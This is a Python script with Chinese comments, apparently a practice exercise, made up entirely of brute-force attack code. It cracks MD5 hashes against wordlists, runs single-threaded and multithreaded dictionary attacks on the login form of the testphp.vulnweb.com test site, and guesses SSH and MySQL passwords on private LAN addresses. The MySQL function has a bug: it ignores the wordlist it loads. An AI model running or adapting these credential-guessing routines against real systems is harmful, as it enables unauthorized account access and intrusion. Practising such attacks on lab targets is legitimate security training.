import hashlib,time,requests
import threading

# 爆破MD5
def md5(source):
    # 打开字典文件，读取字典数据到列表对象中
    with open('./NT.txt') as file:
        pw_list = file.readlines()
    # 可以追加多个字典同时去跑
    with open('./passwd.txt') as file:
        pw_list2 = file.readlines()
    pw_list.extend(pw_list2)

    # 遍历列表，逐个对比
    for password in pw_list:
        if hashlib.md5(password.strip().encode()).hexdigest() == source:
            print(f"成功破解，明文是：{password.strip()}")

# 实战开始，爆破testvuln
# 场景一：用户名已知，密码未知

def vuln_signal():
    with open('./NT.txt') as file:
        pw_list = file.readlines()

    url = 'http://testphp.vulnweb.com/userinfo.php'

    count = 0
    for password in pw_list:
        data = {'uname':'test', 'pass': password.strip()}
        resp = requests.post(url=url, data=data)
        if 'login page' not in resp.text:
            print(f'疑似破解成功, 密码为：{password.strip()}')
            print(f"共计尝试{count}次.")
            exit()
        count += 1

    print(f"共计尝试{count}次.")

# 场景二：未知用户名，未知密码，多线程同时破解
def vuln_thread(username):
    with open('./top100password.txt') as file:
        pw_list = file.readlines()

    url = 'http://testphp.vulnweb.com/userinfo.php'

    count = 0
    for password in pw_list:
        data = {'uname': username, 'pass': password.strip()}
        resp = requests.post(url=url, data=data)
        if 'login page' not in resp.text:
            print(f'疑似破解成功, 密码为：{password.strip()}')
            print(f"共计尝试{count}次.")
            exit()
        count += 1

    print(f"共计尝试{count}次.")

# 爆破优化：多线程分任务爆破
def more_threading(sublist):
    with open('./top100password.txt') as file:
        pw_list = file.readlines()

    url = 'http://testphp.vulnweb.com/userinfo.php'

    for username in sublist:
        for password in pw_list:
            data = {'uname': username.strip(), 'pass': password.strip()}
            resp = requests.post(url=url, data=data)
            if 'login page' not in resp.text:
                print(f'疑似破解成功, 用户名为：{username.strip()} 密码为：{password.strip()}')
                exit()

def ssh_crack():
    import paramiko
    with open('./top100password.txt') as file:
        pw_list = file.readlines()

    for password in pw_list:
        try:
            transport = paramiko.Transport(('192.168.31.13', 22))
            transport.connect(username='kali', password=password.strip())
            print(f"登录成功，密码为：{password.strip()}")
        except:
            pass
        time.sleep(2)

def mysql_crack():
    import pymysql
    with open('./top100password.txt') as file:
        pw_list = file.readlines()
    for password in pw_list:
        try:
            conn = pymysql.connect(host='192.168.1.1', user='kali', password='kali')
            print(f"成功")
        except:
            pass

if __name__ == '__main__':
    # md5('0a869479fd5e5fd6ee419ff656137e0f')
    # vuln_signal()

    # 读取用户字典，并遍历获取用户名（场景二）
    # with open('./top100password.txt') as file:
        # user_list = file.readlines()
    # for username in user_list:
        # threading.Thread(target=vuln_thread, args=(username.strip(),)).start()

    # 拆分字典，每个线程负责10个，提高效率（场景三 优化爆破）
    with open('./top100password.txt') as file:
        user_list = file.readlines()

    for i in range(0, len(user_list), 10):
        sublist = user_list[i:i+10]
        threading.Thread(target=more_threading, args=(sublist, )).start()

    # ssh_crack(
    # mysql_crack()